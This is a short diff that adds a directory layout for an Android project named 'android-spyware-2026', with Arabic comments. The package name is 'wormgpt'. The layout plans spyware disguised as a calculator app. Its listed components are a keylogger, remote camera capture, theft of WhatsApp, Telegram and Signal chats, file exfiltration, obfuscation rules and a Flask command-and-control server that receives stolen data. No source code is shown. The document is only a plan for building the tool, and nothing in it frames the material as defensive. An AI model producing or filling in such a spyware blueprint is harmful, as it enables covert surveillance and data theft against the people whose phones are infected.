@@ -1,0 +1,24 @@
+android-spyware-2026/
+│
+├── app/ # مشروع أندرويد ستوديو
+│ ├── src/main/
+│ │ ├── java/com/wormgpt/spyware/
+│ │ │ ├── MainActivity.java # نقطة الدخول (مخفية كآلة حاسبة)
+│ │ │ ├── SpyService.java # خدمة تعمل في الخلفية (تسرق البيانات)
+│ │ │ ├── CameraService.java # يلتقط صور وفيديوهات عن بُعد
+│ │ │ ├── Keylogger.java # يسجل كل ما يكتبه المستخدم
+│ │ │ ├── MessengerStealer.java # يستخرج محادثات واتساب/تيليجرام/سيجنال
+│ │ │ ├── FileExfiltrator.java # يرسل الصور والفيديوهات والملفات إلى الخادم
+│ │ │ └── NetworkUtils.java # التواصل مع خادم التحكم
+│ │ ├── res/ # الموارد (أيقونات، نصوص)
+│ │ └── AndroidManifest.xml # الأذونات والخدمات
+│ │
+│ ├── build.gradle # إعدادات التعتيم والتبعيات
+│ └── proguard-rules.pro # قواعد تشويش الكود
+│
+├── server/ # خادم التحكم (C2)
+│ ├── c2_server.py # خادم Flask يستقبل البيانات المسروقة
+│ └── requirements.txt # التبعيات اللازمة للخادم
+│
+├── build_apk.sh # سكربت لبناء APK تلقائياً
+└── README.md # تعليمات الإعداد
